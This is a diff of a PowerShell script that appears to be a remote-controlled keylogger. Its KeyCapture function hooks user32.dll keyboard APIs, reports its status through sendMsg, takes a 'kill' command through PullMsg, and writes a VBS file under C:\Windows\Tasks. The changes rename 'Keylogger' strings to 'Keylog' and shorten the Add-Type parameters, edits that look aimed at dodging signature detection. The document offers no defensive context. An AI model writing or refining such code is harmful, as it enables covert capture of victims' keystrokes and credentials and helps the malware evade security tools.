@@ -943,10 +943,12 @@ param ([int[]]$t)
 }
 
 Function KeyCapture {
-    sendMsg -Message ":mag_right: ``Keylogger Started`` :mag_right:"
+
+    sendMsg -Message ":mag_right: ``Keylog Started`` :mag_right:"
     $API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
-    $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
+    $API = Add-Type -M $API -Name 'Win32' -Names API -PassThru
     $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
+    # Change for frequency
     $KeypressThreshold = [TimeSpan]::FromSeconds(10)
     While ($true){
         $keyPressed = $false
@@ -975,7 +977,7 @@ Function KeyCapture {
             }
             PullMsg
             if ($response -like "kill") {
-            sendMsg -Message ":mag_right: ``Keylogger Stopped`` :octagonal_sign:"
+            sendMsg -Message ":mag_right: ``Keylog Stopped`` :octagonal_sign:"
             $script:previouscmd = $response
 	    $VBpath = "C:\Windows\Tasks\service.vbs"
             $tobat = @"
